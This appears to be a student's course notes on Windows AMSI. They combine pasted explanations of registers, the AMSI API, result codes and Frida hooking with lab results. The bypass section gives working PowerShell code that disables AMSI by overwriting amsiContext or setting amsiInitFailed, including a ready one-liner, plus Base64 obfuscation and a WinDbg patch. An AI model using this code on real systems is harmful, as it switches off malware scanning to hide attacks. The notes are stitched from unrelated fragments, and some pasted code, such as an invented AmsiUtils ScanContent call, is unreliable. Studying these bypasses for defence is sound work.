### Introduction:

- EDR evasion beyond scope of the course
- Powershell code running in memory evaded detection
	- MS put Antimalware Scan Interface (AMSI) to allow AV products to scan Powershell commands and scripts when executed (even when they don't touch disk)
- Module will explore AMSI impact on Powershell and JScript in the context of Windows Defender

### Intel Arch and Win 10

#### 32-bit Registers

- General Registers: EAX, EBX, ECX, EDX
- Segment Registers: CS DS ES FS GS SS
- Index and pointers: ESI EDI EBP EIP ESP
- Indicator: EFLAGS
- EIP and ESP

The `EIP` (Extended Instruction Pointer) and `ESP` (Extended Stack Pointer) are two important registers in the x86 architecture used to control the execution flow of a program and manage the stack, respectively.

### EIP (Extended Instruction Pointer)
- **Purpose**: The `EIP` register holds the address of the next instruction to be executed in a program. It essentially points to the current location in the code segment where the CPU is fetching instructions to execute.
- **Behavior**: 
  - After fetching an instruction, the CPU increments the `EIP` to point to the subsequent instruction.
  - If a jump, call, or interrupt occurs, the `EIP` is updated to point to the target address of the jump, call, or interrupt handler.
- **Manipulation**: You typically do not modify `EIP` directly in your code. Instead, you influence it indirectly through control flow instructions (e.g., `jmp`, `call`, `ret`).

#### Example Usage
```assembly
jmp LABEL   ; Unconditional jump to LABEL
call FUNCTION ; Call FUNCTION and push return address onto the stack
```

### ESP (Extended Stack Pointer)
- **Purpose**: The `ESP` register points to the top of the stack, which is a region of memory used for dynamic memory allocation and function call management. The stack operates in a last-in, first-out (LIFO) manner.
- **Behavior**:
  - **Push Operation**: When data is pushed onto the stack, the `ESP` is decremented (the stack grows downwards in memory) and the data is stored at the new `ESP` location.
  - **Pop Operation**: When data is popped from the stack, the data is read from the `ESP` location and then `ESP` is incremented.
- **Function Calls**: During a function call, the return address, local variables, and function parameters are typically stored on the stack, with `ESP` managing the position.

#### Example Usage
```assembly
push eax    ; Push the value of EAX onto the stack
pop ebx     ; Pop the value from the stack into EBX
```

### Relationship Between EIP and ESP
- During a function call:
  - The return address (the address of the instruction following the call) is pushed onto the stack, and `ESP` is decremented.
  - `EIP` is updated to point to the called function's entry point.
- When the function returns:
  - The return address is popped from the stack into `EIP`, and `ESP` is incremented.
  - Execution continues from the return address.

### Example: Function Call and Return
Here’s a simplified example of how `EIP` and `ESP` are used during a function call and return:
```assembly
; Main program
call myFunction   ; Push return address onto the stack and jump to myFunction

; Return address will point here after the function call
...

; Function definition
myFunction:
  push ebp        ; Save base pointer
  mov ebp, esp    ; Set base pointer to the current stack pointer
  sub esp, 8      ; Allocate space for local variables

  ; Function body
  ...

  mov esp, ebp    ; Restore stack pointer
  pop ebp         ; Restore base pointer
  ret             ; Pop return address into EIP and jump back
```

### 64-bit Registers RIP and RSP

The `RIP` (Instruction Pointer) and `RSP` (Stack Pointer) are equivalent to `EIP` and `ESP` in the x86-64 architecture (also known as x64 or AMD64), which is an extension of the x86 architecture. Here’s an explanation of `RIP` and `RSP` and how they function in the context of 64-bit computing:

### RIP (Instruction Pointer)
- **Purpose**: The `RIP` register holds the address of the next instruction to be executed in a 64-bit program.
- **Behavior**:
  - After fetching an instruction, the CPU increments `RIP` to point to the subsequent instruction.
  - Control flow instructions such as jumps, calls, and interrupts modify `RIP` to point to the target address.
- **Manipulation**: As with `EIP`, `RIP` is typically manipulated indirectly through control flow instructions (`jmp`, `call`, `ret`, etc.).
- **64-bit Advantage**: The `RIP` register can address a much larger memory space (up to 2^64 bytes), accommodating the needs of modern applications.

#### Example Usage
```assembly
jmp LABEL   ; Unconditional jump to LABEL
call FUNCTION ; Call FUNCTION and push return address onto the stack
```

### RSP (Stack Pointer)
- **Purpose**: The `RSP` register points to the top of the stack in a 64-bit program. The stack is used for managing function calls, local variables, and dynamic memory allocation.
- **Behavior**:
  - **Push Operation**: When data is pushed onto the stack, `RSP` is decremented, and the data is stored at the new `RSP` location.
  - **Pop Operation**: When data is popped from the stack, the data is read from the `RSP` location, and then `RSP` is incremented.
- **64-bit Advantage**: The `RSP` register can handle the larger address space and stack requirements of 64-bit applications.

#### Example Usage
```assembly
push rax    ; Push the value of RAX onto the stack
pop rbx     ; Pop the value from the stack into RBX
```

### Relationship Between RIP and RSP
- During a function call:
  - The return address (the address of the instruction following the call) is pushed onto the stack, and `RSP` is decremented.
  - `RIP` is updated to point to the called function's entry point.
- When the function returns:
  - The return address is popped from the stack into `RIP`, and `RSP` is incremented.
  - Execution continues from the return address.

### Example: Function Call and Return in 64-bit Assembly
Here’s a simplified example of how `RIP` and `RSP` are used during a function call and return in 64-bit assembly:
```assembly
; Main program
call myFunction   ; Push return address onto the stack and jump to myFunction

; Return address will point here after the function call
...

; Function definition
myFunction:
  push rbp        ; Save base pointer
  mov rbp, rsp    ; Set base pointer to the current stack pointer
  sub rsp, 16     ; Allocate space for local variables (align stack to 16 bytes)

  ; Function body
  ...

  mov rsp, rbp    ; Restore stack pointer
  pop rbp         ; Restore base pointer
  ret             ; Pop return address into RIP and jump back
```


### WinDdb 

- Hangs apps on Win11 arm VM
- Win10 x64 VM works ok


### Antimalware Scan Interface

The **Antimalware Scan Interface (AMSI)** is a Microsoft feature designed to improve the detection and prevention of malware on Windows systems by allowing applications and services to request antivirus scans on data at various stages of execution. Here’s a summary of its functionality, with a focus on potential exploitable weaknesses in Windows 10, Windows 11, and server versions past 2019:

### Overview of AMSI
- **Purpose**: AMSI provides a standardized interface for applications and services to integrate with antivirus software, enabling real-time scanning and detection of potentially malicious code.
- **Functionality**:
  - **Dynamic Content Scanning**: AMSI can scan scripts, macros, and other dynamic content at runtime.
  - **Integration**: It is integrated with various Windows components, including Windows Defender, PowerShell, and Office macros.
  - **Universal API**: Third-party antivirus solutions can also use AMSI to scan content requested by applications.

### Key Features
- **Scripting Engines Integration**: AMSI is commonly used to scan scripts executed by scripting engines such as PowerShell and JavaScript.
- **Macro and Document Scanning**: It can scan Office documents and macros for malicious content.
- **Memory Scanning**: AMSI can scan code in memory, providing real-time protection against in-memory attacks.

### Exploitable Weaknesses
Despite its robust design, AMSI has some potential weaknesses that could be exploited:

1. **Bypassing AMSI**:
   - **Obfuscation**: Attackers can obfuscate scripts and payloads to evade AMSI detection. Techniques such as string concatenation, encoding, or encryption can be used to hide malicious code from AMSI scans.
   - **AMSI Initialization Hook**: Malware can tamper with the initialization of the AMSI DLL (`amsi.dll`) in the target application’s process to disable AMSI checks. This involves modifying the memory of the running process to alter or bypass AMSI-related functions.
   - **AMSI Context Manipulation**: Attackers can modify the `AMSI_CONTEXT` or `AMSI_BUFFER` structures directly in memory to alter the content being scanned or to disable scanning altogether.

2. **Code Injection**:
   - **Reflective DLL Injection**: Injecting a DLL that patches or hooks AMSI functions in memory can effectively disable AMSI for the target process.
   - **Process Hollowing**: Loading a legitimate process, unmapping its memory, and replacing it with malicious code that disables AMSI can evade detection.

3. **Exploiting Scripting Engines**:
   - **PowerShell AMSI Bypass**: Using techniques to disable AMSI within PowerShell scripts, such as reflection to modify the `amsi.dll` entry points or using low-level Windows APIs to modify the behavior of loaded assemblies.
   - **JavaScript and Other Engines**: Similar techniques can be used in other scripting environments that integrate with AMSI.

4. **Insufficient Coverage**:
   - **Third-Party Applications**: Not all third-party applications and scripts may be covered by AMSI, leading to potential gaps in protection.
   - **Custom Scripts**: Custom or less common scripting languages may not utilize AMSI, providing a vector for attackers.

### Recent Exploitable Instances
While Microsoft continuously updates AMSI to address new threats, the following versions have had notable weaknesses:
- **Windows 10 and 11**: Various AMSI bypass techniques have been demonstrated, including PowerShell script obfuscation and in-memory patching.
- **Windows Server 2019 and later**: Server environments often run custom scripts and applications that may not fully integrate with AMSI, presenting potential attack vectors.

### Mitigations
To mitigate the risks associated with AMSI weaknesses, consider the following measures:
- **Regular Updates**: Ensure that Windows and antivirus software are regularly updated to benefit from the latest security patches and improvements.
- **Script Monitoring**: Implement strict monitoring and logging of script execution, especially in environments where PowerShell and other scripting engines are used extensively.
- **Application Whitelisting**: Use application whitelisting to control which scripts and binaries can execute, reducing the risk of executing obfuscated or malicious code.
- **Enhanced Obfuscation Detection**: Utilize advanced threat detection solutions capable of identifying and mitigating obfuscation techniques.

By understanding and addressing these weaknesses, administrators can better protect their systems from potential exploits targeting the AMSI infrastructure.

AMSI (Antimalware Scan Interface) is a Microsoft interface that provides a way for applications and services to integrate with any antimalware product that's present on a machine. It is primarily used to detect and block malicious scripts and other potentially harmful activities in real-time.

### How AMSI Works

1. **Integration with Applications**:
   - Applications that execute potentially harmful code, such as script engines (PowerShell, JavaScript, VBScript) or interpreters, integrate with AMSI by making calls to its API.
   - When an application processes code that needs to be executed or interpreted, it passes this code to AMSI for scanning.

2. **Scanning Process**:
   - The application creates a `hAMSISESSION` session handle by calling `AmsiInitialize`.
   - The code to be scanned is submitted to AMSI via `AmsiScanBuffer` or `AmsiScanString`.
   - AMSI forwards the code to the installed antimalware software for scanning.

3. **Detection**:
   - The antimalware software scans the code for malicious content using its heuristics, signatures, and behavioral analysis.
   - If the antimalware software detects malicious code, it returns a detection result to AMSI.
   - AMSI then communicates this result back to the application, which can take appropriate action (e.g., block the script from executing).

### AMSI Workflow

1. **Initialization**: The application calls `AmsiInitialize` to initialize AMSI.
2. **Session Creation**: The application calls `AmsiOpenSession` to create a scanning session.
3. **Scanning**: The application submits code for scanning using `AmsiScanBuffer` or `AmsiScanString`.
4. **Result Handling**: AMSI returns the scanning result, and the application can take action based on this result (e.g., blocking execution if malicious content is found).
5. **Session Closure**: The application calls `AmsiCloseSession` to close the scanning session.
6. **Termination**: The application calls `AmsiUninitialize` to uninitialize AMSI.

### Example in PowerShell

When a PowerShell script is executed, PowerShell uses AMSI to scan the script content before execution. Here's a simplified example of how this works:

1. **Script Execution**:
   - A user or process initiates the execution of a PowerShell script.

2. **Script Scanning**:
   - PowerShell passes the script content to AMSI for scanning:
     ```powershell
     $scriptContent = Get-Content -Path "malicious_script.ps1" -Raw
     $amsiResult = [AmsiUtils]::ScanContent($scriptContent)
     ```

3. **Antimalware Scan**:
   - AMSI forwards the content to the installed antimalware solution, which scans the script.

4. **Detection**:
   - If the antimalware solution detects malicious content, it informs AMSI, which in turn informs PowerShell.

5. **Blocking Execution**:
   - Based on the AMSI result, PowerShell can decide to block the execution of the script if it is deemed malicious.

### Evading AMSI

Despite its effectiveness, attackers have developed several techniques to evade AMSI detection, including:

1. **Memory Patching**: Modifying AMSI-related functions in memory to disable or bypass scanning.
2. **String Obfuscation**: Obfuscating malicious payloads to avoid detection by AMSI.
3. **Loading Scripts from Memory**: Executing scripts directly from memory without writing to disk to avoid AMSI scanning.

### AMSI in Windows 10, 11, and Server

AMSI is an integral part of Windows 10, 11, and Windows Server editions (post-2016). It is designed to enhance the security of these platforms by providing real-time malware scanning capabilities integrated into the operating system and its applications.

### Potential Exploitable Weaknesses

1. **Bypassing via Obfuscation**: Attackers can obfuscate their scripts or payloads to avoid detection by AMSI.
2. **In-Memory Attacks**: Malware can modify AMSI-related code or data structures in memory to disable its functionality.
3. **AMSI Patching**: Malware can patch AMSI functions to always return clean results, effectively disabling AMSI detection.


AMSI (Antimalware Scan Interface) results, indicated by the `AMSI_RESULT` enumeration, represent the possible outcomes of a scan by the antimalware software. Each value signifies a different level of threat or response based on the scan.

Here are all the possible values of `AMSI_RESULT`:

1. **AMSI_RESULT_CLEAN (0)**
   - Indicates that the scanned content is clean and no threat has been detected.

2. **AMSI_RESULT_NOT_DETECTED (1)**
   - Indicates that no threat was detected, but it does not guarantee the content is clean. It might be used in cases where the antimalware engine cannot conclusively determine the status.

3. **AMSI_RESULT_BLOCKED_BY_ADMIN_START (16384 or 0x4000)**
   - The start of a range for results that indicate the content is blocked based on administrative policies. The exact reason within this range depends on specific policies set by administrators.

4. **AMSI_RESULT_BLOCKED_BY_ADMIN_END (20479 or 0x4FFF)**
   - The end of the range for results indicating administrative blocks. Any value within this range implies administrative intervention rather than direct threat detection by the engine.

5. **AMSI_RESULT_DETECTED (32768 or 0x8000)**
   - Indicates that the scanned content is malicious, and a threat has been positively identified.

### Summary of Values:

- **0 (AMSI_RESULT_CLEAN)**: Content is clean.
- **1 (AMSI_RESULT_NOT_DETECTED)**: No threat detected (not a conclusive clean result).
- **16384-20479 (AMSI_RESULT_BLOCKED_BY_ADMIN_START to AMSI_RESULT_BLOCKED_BY_ADMIN_END)**: Content blocked by admin policy.
- **32768 (AMSI_RESULT_DETECTED)**: Threat detected.

### Usage Example:

When you use AMSI to scan content, you will receive one of these `AMSI_RESULT` values. Here’s a simple example in C#:

```csharp
AMSI_RESULT result = AmsiScanBuffer(session, buffer, bufferSize, "contentName", ref amsiContext);

switch (result)
{
    case AMSI_RESULT_CLEAN:
        Console.WriteLine("Content is clean.");
        break;
    case AMSI_RESULT_NOT_DETECTED:
        Console.WriteLine("No threat detected.");
        break;
    case AMSI_RESULT_DETECTED:
        Console.WriteLine("Threat detected!");
        break;
    default:
        if (result >= AMSI_RESULT_BLOCKED_BY_ADMIN_START && result <= AMSI_RESULT_BLOCKED_BY_ADMIN_END)
        {
            Console.WriteLine("Content blocked by admin policy.");
        }
        else
        {
            Console.WriteLine("Unknown result.");
        }
        break;
}
```

In this example, you call `AmsiScanBuffer`, check the result against the possible `AMSI_RESULT` values, and handle each case accordingly. This approach ensures that your application properly responds to different scan outcomes, maintaining security and adhering to administrative policies.


### Hooking with Frida

Frida is a dynamic instrumentation toolkit for developers, reverse engineers, and security researchers. It allows you to inject JavaScript to hook APIs and modify the behavior of applications on Windows, macOS, Linux, iOS, and Android. Here’s an overview of how hooking with Frida works:

### Basic Concepts

1. **Hooking**: Hooking refers to intercepting function calls or system calls. By hooking, you can change how functions behave, log their calls, modify their parameters, or prevent them from executing.

2. **Instrumentation**: Instrumentation involves inserting additional code into a program to monitor or modify its behavior.

### How Frida Works

1. **Injection**: Frida injects a small library (`frida-agent`) into the target process. This library allows you to run JavaScript code inside the process.

2. **Scripting**: You write JavaScript scripts that Frida will execute within the context of the target process. These scripts can hook into functions, modify their behavior, log data, etc.

3. **Communication**: Frida uses inter-process communication (IPC) to send data between your script and the Frida client.

### Setting Up Frida

1. **Installation**:
   - Install Frida on your computer using `pip`:
     ```bash
     pip install frida-tools
     ```
   - Ensure you have the Frida server running on the target device (required for iOS and Android). You can download the Frida server from [Frida's releases page](https://github.com/frida/frida/releases).

2. **Running the Frida Server**:
   - On Android:
     ```bash
     adb push frida-server /data/local/tmp/
     adb shell "chmod 755 /data/local/tmp/frida-server && /data/local/tmp/frida-server &"
     ```
   - On iOS, you need to have a jailbroken device to run the Frida server.

### Example: Hooking a Function

Here’s a simple example to hook a function in a Windows application using Frida.

1. **Start the Target Process**:
   - Ensure the target application is running.

2. **Write the Hook Script**:
   - Create a JavaScript file `hook.js`:
     ```javascript
     // Find the function to hook
     var targetFunction = Module.findExportByName(null, "MessageBoxW");

     // Intercept the function call
     Interceptor.attach(targetFunction, {
         onEnter: function (args) {
             // Log the arguments
             console.log("MessageBoxW called");
             console.log("Text: " + Memory.readUtf16String(args[1]));
             console.log("Caption: " + Memory.readUtf16String(args[2]));
             
             // Modify the arguments (for example, change the text)
             var newText = "Hooked by Frida!";
             args[1] = Memory.allocUtf16String(newText);
         },
         onLeave: function (retval) {
             // Log the return value
             console.log("MessageBoxW returned: " + retval);
         }
     });
     ```

3. **Run the Hook Script**:
   - Use the `frida` command-line tool to inject the script into the target process:
     ```bash
     frida -p <process-id> -l hook.js
     ```

### Advanced Hooking

1. **Hooking Native Functions**:
   - You can hook any native function, not just exported functions. Use `Module.enumerateSymbolsSync` to find internal functions.

2. **Hooking Java Methods** (Android):
   - Frida allows you to hook Java methods directly.
     ```javascript
     Java.perform(function() {
         var MainActivity = Java.use("com.example.app.MainActivity");
         MainActivity.someMethod.implementation = function(arg) {
             console.log("someMethod called with arg: " + arg);
             var result = this.someMethod(arg); // Call the original method
             console.log("someMethod result: " + result);
             return result;
         };
     });
     ```

3. **Hooking ObjC Methods** (iOS):
   - You can hook Objective-C methods similarly.
     ```javascript
     if (ObjC.available) {
         var MyClass = ObjC.classes.MyClass;
         var myMethod = MyClass["- myMethod:"];
         Interceptor.attach(myMethod.implementation, {
             onEnter: function (args) {
                 console.log("myMethod called");
             },
             onLeave: function (retval) {
                 console.log("myMethod returned");
             }
         });
     }
     ```


#### Example:
	1. Modified onEnter and onExit in AmsiScanBuffer.js
		1. If one enters 'amsiutils' in Powershell session

![](Images/07-Frida-Logging.png)

![](Images/07-Frida-Logging-Pwsh-Failed.png)

			2. Result value of 32768 indicates a failed scan


	2. Bypass AMSI detection on Powershell command line
		1. couldn't break up string to bypass in Win11 (eg 'am'+'siutils')
		2. Could use Base64 encoding to bypass 7
```powershell
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("YW1zaXR1aWxzCg=="))
```
![](Images/07-Frida-Bypass-AmsiScanner.png)


### Bypassing AMSI with Reflection in Powershell

- Windows Defender will cause a block when obtaining a reference to a class if one is including the AmsiUtils string.
- Strategy is to search for AmsiUtils using `GetTypes` and searching for the string "iUtils"
```powershell
$a=[Ref].Assembly.GetTypes()
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$b}}
```
- PowerShell stores information about AMSI in managed code inside the _System.Management.Automation.AmsiUtils_ class

##### Overwrite the amsiContext header with zeros:
```powershell
$a=[Ref].Assembly.GetTypes()
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}
$g=$f.GetValue($null)
[IntPtr]$ptr=$g
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```
- this will force AmsiOpenSession to error out
- *Note:* had to run this 3-4 times on Win10 to get the header overwritten with zeros (was flagged by Defender...Real Time protection was *On*)
- one-liner:
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```
- Another amsi bypass using amsiInitFailed (Win10...errors on Win11 arm)
```powershell
$a=[Ref].Assembly.GetTypes()
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d) {if ($e.Name -like "*ms*nit*ai*") {$f=$e}}
$g=$f.SetValue($null,$true)
```


### Breakdown of the Instruction
- `mov` is an assembly instruction used to move data from one place to another.
- `eax` is one of the general-purpose registers in x86 and x86-64 architectures.
- `80070057h` is a hexadecimal value.

### Example in Context

#### Assembly Example
In an assembly language program, this instruction might be part of an error-handling routine or might be used to set up a specific error condition.

```asm
section .text
    global _start

_start:
    mov     eax, 80070057h   ; Move the error code into the EAX register
    ; Further instructions here
    ; ...

    ; Exit the program
    mov     eax, 1           ; syscall number for sys_exit
    xor     ebx, ebx         ; exit code 0
    int     0x80             ; make the syscall
```

#### C/C++ Example
In C or C++, you might define and use this error code as follows:

```c
#include <stdio.h>

#define ERROR_INVALID_PARAMETER 0x80070057

void checkErrorCode(unsigned int errorCode) {
    if (errorCode == ERROR_INVALID_PARAMETER) {
        printf("Error: Invalid parameter (0x%08X)\n", errorCode);
    } else {
        printf("Error: Unknown (0x%08X)\n", errorCode);
    }
}

int main() {
    unsigned int errorCode = ERROR_INVALID_PARAMETER;
    checkErrorCode(errorCode);
    return 0;
}
```

### Interpretation of the Error Code
The error code `0x80070057` is often encountered in Windows API calls and indicates that one or more parameters passed to a function are not valid. Here's how to interpret the code:

- `0x8007`: The facility code, indicating it's a Win32 error.
- `0057`: The specific error code within the facility, corresponding to `ERROR_INVALID_PARAMETER`.

Understanding this error code can help diagnose issues in software development, especially when interacting with Windows APIs.

### Usage in Debugging
When debugging, especially when analyzing crash dumps or error logs, encountering this specific value in the `eax` register or as part of a function return value can indicate that an invalid parameter was passed to a function, which can guide you towards finding the root cause of a problem.

### Example
If the `rcx` register contains the value `0x0000000140001000`, executing `dc rcx L1` might produce output similar to:

```
00000001`40001000  12345678
```

This output shows the memory address (`00000001`40001000) followed by the DWORD value (`12345678`) stored at that address.

![](Images/07-Bypassing-AMSI-Windbg.png)
In WinDbg, the command `dc rcx L1` is used to display memory contents. Let's break down the components of this command:

1. **`dc`**: This command stands for "Display memory in DWORDs." It displays the contents of memory at a specified address in DWORD (4-byte) units. 

2. **`rcx`**: This is the register whose value is used as the starting address for the memory display. `rcx` is one of the general-purpose registers in x86-64 architecture.

3. **`L1`**: This specifies the length of the display. `L1` means to display 1 DWORD (4 bytes) of memory starting from the address in `rcx`.

So, the command `dc rcx L1` in WinDbg displays 4 bytes of memory starting at the address stored in the `rcx` register.

In the above image, the contents of AMSI Header value was overwritten.

#### Bypassing AMSI by modifying amsiContext field

*Note:* This works in Windows 10 (build 17763), but fails with current versions
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```


### Step-by-Step Breakdown:

1. **Retrieve All Types in the Assembly**:
   ```powershell
   $a=[Ref].Assembly.GetTypes();
   ```
   This line gets all types from the current assembly that the PowerShell script is running in. It does this by calling `GetTypes()` on the assembly retrieved from `[Ref].Assembly`. The `Ref` keyword is used as a placeholder for reflection-based actions, though it may not point to the correct assembly directly unless specified.

2. **Iterate Through Types and Find a Type Whose Name Matches `*iUtils`**:
   ```powershell
   Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};
   ```
   This loop iterates through all the types retrieved from the assembly (`$a`), checking if the type's name contains the string `"iUtils"`. If a match is found, it stores the type information in the `$c` variable.

3. **Get All Non-Public, Static Fields of the Matched Type**:
   ```powershell
   $d=$c.GetFields('NonPublic,Static');
   ```
   Once the type is found (`$c`), this line retrieves all fields that are non-public and static (usually private or protected static fields). This method call is using reflection to access fields that wouldn't normally be accessible in standard code execution.

4. **Iterate Through Fields and Find One Whose Name Matches `*Context`**:
   ```powershell
   Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};
   ```
   This loop goes through the fields found in the previous step (`$d`), looking for one with a name that contains the string `"Context"`. The field that matches is stored in the `$f` variable.

5. **Get the Value of the Context Field**:
   ```powershell
   $g=$f.GetValue($null);
   ```
   This uses reflection again to get the value of the matched field (`$f`). The `$null` argument is passed because the field is static, meaning it doesn't belong to an instance of a class. The field value (`$g`) is expected to hold some important data, which could be an object, a pointer, or some application context.

6. **Cast the Field Value to `IntPtr`**:
   ```powershell
   [IntPtr]$ptr=$g;
   ```
   Here, the value retrieved from the field is cast to an `IntPtr`. This suggests that the field value is likely a pointer (memory address), which could be referencing a block of memory or a handle to some resource.

7. **Prepare a Buffer to Write**:
   ```powershell
   [Int32[]]$buf = @(0);
   ```
   This creates a buffer containing a single element, `0`, of type `Int32`. This buffer will be used for writing to memory.

8. **Write the Buffer to the Memory Location**:
   ```powershell
   [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
   ```
   This line uses the `Marshal.Copy` method from `System.Runtime.InteropServices` to copy the content of the `$buf` (which contains just `0`) to the memory location pointed to by `$ptr`. The `0` indicates the starting index of the array, and the `1` specifies that one element (in this case, the single `0`) should be written.



### Example

```assembly
mov rcx, 0        ; Load 0 into rcx
test rcx, rcx     ; Test if rcx is zero
jz zero_label     ; Jump to zero_label if Zero Flag is set

mov rcx, 1234h    ; Load a non-zero value into rcx
test rcx, rcx     ; Test if rcx is zero
jnz non_zero_label; Jump to non_zero_label if Zero Flag is not set

zero_label:
    ; Code to execute if rcx is zero

non_zero_label:
    ; Code to execute if rcx is non-zero
```

In this example:
- The first `test rcx, rcx` sets the Zero Flag because `rcx` is zero, so the `jz` (jump if zero) instruction will jump to `zero_label`.
- The second `test rcx, rcx` clears the Zero Flag because `rcx` is non-zero, so the `jnz` (jump if not zero) instruction will jump to `non_zero_label`.

The `cmp qword ptr [rcx+8], 0` instruction in assembly language is used to compare the value stored at the memory location `[rcx + 8]` with zero. It performs a subtraction of `0` from the value at `[rcx + 8]`, but it does not store the result. Instead, it updates the processor's flags based on the result of this subtraction, which can then be used for conditional branching.

### Explanation

- **Opcode**: `cmp`
- **Operands**: `qword ptr [rcx+8]`, `0`

Here, `qword ptr [rcx+8]` specifies that the operation should consider a 64-bit (8-byte) value at the memory location computed by adding 8 to the value in the `rcx` register. The `cmp` instruction subtracts `0` from this value and sets the CPU flags accordingly, without modifying the value at `[rcx+8]`.

### Flags Affected
- **Zero Flag (ZF)**: Set if the value at `[rcx+8]` is zero.
- **Sign Flag (SF)**: Set according to the sign of the result (i.e., the value at `[rcx+8]`).
- **Carry Flag (CF)**: Set if a borrow occurs (not relevant here since we're subtracting 0).
- **Overflow Flag (OF)**: Set if signed overflow occurs.

### Example

```assembly
mov rcx, rsi         ; Assume rsi points to a structure
cmp qword ptr [rcx+8], 0  ; Compare the 64-bit value at offset 8 from rcx with 0
je value_is_zero     ; Jump to value_is_zero if the value is zero
jne value_is_nonzero ; Jump to value_is_nonzero if the value is non-zero

value_is_zero:
    ; Code to execute if the value at [rcx + 8] is zero
    ...

value_is_nonzero:
    ; Code to execute if the value at [rcx + 8] is non-zero
    ...
```

In this example:
- The `mov rcx, rsi` instruction sets up the `rcx` register to point to a structure or memory block.
- The `cmp qword ptr [rcx+8], 0` instruction checks whether the 64-bit value located at the address `rcx + 8` is zero.
- The `je` (jump if equal) instruction will jump to the `value_is_zero` label if the value at `[rcx + 8]` is zero.
- The `jne` (jump if not equal) instruction will jump to the `value_is_nonzero` label if the value at `[rcx + 8]` is non-zero.

Change `rcx+8` to `0` to bypass AMSI in Windbg

![](Images/07-Bypassing-AMSI-Windbg-OpenSession.png)


